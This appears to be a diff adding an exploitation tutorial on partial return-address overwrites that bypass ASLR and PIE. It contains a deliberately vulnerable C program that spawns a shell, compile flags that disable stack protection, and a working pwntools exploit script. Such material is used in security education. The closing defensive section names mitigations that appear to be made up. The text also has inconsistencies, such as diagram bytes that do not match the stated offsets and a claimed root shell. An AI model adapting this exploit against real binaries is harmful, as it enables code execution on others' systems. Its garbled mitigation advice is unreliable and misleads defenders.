@@ -1,1 +1,123 @@
 
+A Partial Overwrite is a highly efficient technique used to bypass ASLR and PIE without needing an information leak (infoleak).
+When ASLR randomizes the memory map, it shifts the base address of the application and its libraries, but it does not randomize the relative positions of functions within the same memory segment. Furthermore, page-alignment rules mean that the lowest 12 bits (1.5 bytes) of a memory address never change.
+By using a buffer overflow to overwrite only the lowest 1 or 2 bytes of the Saved Return Address, you can redirect execution to an adjacent function (like a hidden win() function) while leveraging the randomized base address already loaded into the CPU.
+
+1. The Geometry of a Partial Overwrite (The 12-Bit Rule)
+
+Memory pages are allocated in blocks of 4096 bytes (0x1000). Because of this, the lowest 3 hex digits (12 bits) of a function's address remain completely static across reboots.
+Imagine the static offsets found in your disassembler are:
+• vulnerable_function: 0x55555555**11a0**
+• win: 0x55555555**11c5**
+When ASLR randomizes the executable, the base shifts, turning the runtime addresses into something like:
+• vulnerable_function: 0x560a3df9**11a0**
+• win: 0x560a3df9**11c5**
+Notice that the top bytes shift randomly, but the bottom byte (\xc5) remains completely fixed.
+
+The 1-Byte Overwrite (No Brute-Force)
+
+If the target function shares the exact same upper digits, you can perform a 1-byte overwrite. By writing just \xc5 into the lowest byte of the return address, you instantly redirect execution to win() without needing to know the rest of the randomized base address.
+
+The 2-Byte Overwrite (The 4-Bit Brute-Force Dilemma)
+
+If your target function sits slightly further away (e.g., ending in 0x22c5), you must overwrite 2 bytes (\x22\xc5).
+• The lowest 12 bits (\x2c5) are static.
+• The 4th hex digit (\x2) is part of the randomized ASLR space.
+• This introduces a 4-bit guess (2⁴ = 16 possible combinations). Your exploit script must run in a loop, expecting to succeed statistically 1 out of 16 times.
+
+2. The Vulnerable C Program (partial_vuln.c)
+
+This program features a hidden win() function located very close to the code execution frame.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Spawning administrative shell...\n");
+    system("/bin/sh");
+}
+
+void vulnerable_function() {
+    char buffer[64];
+    printf("Enter input: ");
+    // VULNERABILITY: Allows us to carefully overflow past the buffer limits
+    // We can write exactly enough bytes to hit just the tip of the return address.
+    read(0, buffer, 80); 
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vulnerable_function();
+    return 0;
+}
+Use code with caution.
+
+Compilation (Full ASLR/PIE Active)
+
+bash
+gcc -m32 -fno-stack-protector -fPIE -pie partial_vuln.c -o partial_vuln
+Use code with caution.
+
+3. Step-by-Step Exploitation Plan
+
+text
+       Top of Stack (Lower Memory Address)
+       +------------------------------------+
+
+       |   buffer (64 bytes)                |
+       +------------------------------------+
+
+       |   Compiler Padding / Saved EBP     |  <-- Filled with 'A's
+       +------------------------------------+
+
+       |   [0xba] [0x11] [0xf9] [0x56]      |  <-- Return Address (Randomized)
+       +------------------------------------+
+             |
+             +--- We overwrite ONLY the lowest byte [0xba] -> [0xc5]
+Use code with caution.
+1. Calculate the Offset: Find the exact number of bytes required to reach the first byte of the Return Address. Let's assume it takes exactly 76 bytes.
+2. Locate Target Byte: Inspect the static offsets of vulnerable_function's return path and win() in your disassembler to isolate the target byte change (e.g., changing the final byte to \xc5).
+3. Partial Write: Send 76 bytes of garbage padding followed directly by the single raw byte \xc5.
+
+4. The Python Exploit Script (partial_overwrite.py)
+
+Using pwntools, we pipe a precise, un-terminated byte sequence into the stream to clip the edge of the memory register.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Context configuration
+context.update(arch='i386', os='linux')
+
+# Exact padding to reach the Return Address pointer
+# 64 (buffer) + 8 (compiler padding) + 4 (Saved EBP) = 76 bytes
+offset = 76
+
+# Target byte to substitute the lowest byte of the return address.
+# Discovered by matching the final hex characters of win() in static analysis.
+target_byte = b"\xc5" 
+
+# Build the payload without a trailing newline or null terminator 
+# to ensure we don't accidentally corrupt the upper bytes of the return address!
+payload = b"A" * offset + target_byte
+
+# Establish the execution process
+io = process('./partial_vuln')
+
+io.recvuntil(b"Enter input: ")
+log.info(f"Deploying partial overwrite payload... Injecting byte: {hex(target_byte[0])}")
+
+# Send the raw payload
+io.send(payload)
+
+# If the ASLR shift aligned properly (100% success for 1-byte, 1/16 for 1.5-byte),
+# execution jumps straight to win() and drops us into a root shell.
+io.interactive()
+Use code with caution.
+
+5. Defensive Architectural Rules Against Partial Overwrites
+
+Because partial overwrites manipulate the lower, static offsets of execution frames, they are completely immune to standard ASLR. To stop them, developers must enforce strict compiler mitigations:
+• Enable Position Independent Executable Padding: Modern compilers use PIE hardening to widen the relative compiler distance between code execution tracking frames and structural global functions, ensuring that jumping between functional boundaries requires cross-page overwrites that trigger a 4-bit or 12-bit randomized brute-force penalty.
+• Activate Position Independent Stack Canaries: Enforcing stack protection flags (-fstack-protector-strong) ensures that even if you only want to overwrite a single byte of the return address, you cannot reach it without rewriting the stack canary tripwire first, resulting in an instant application crash.
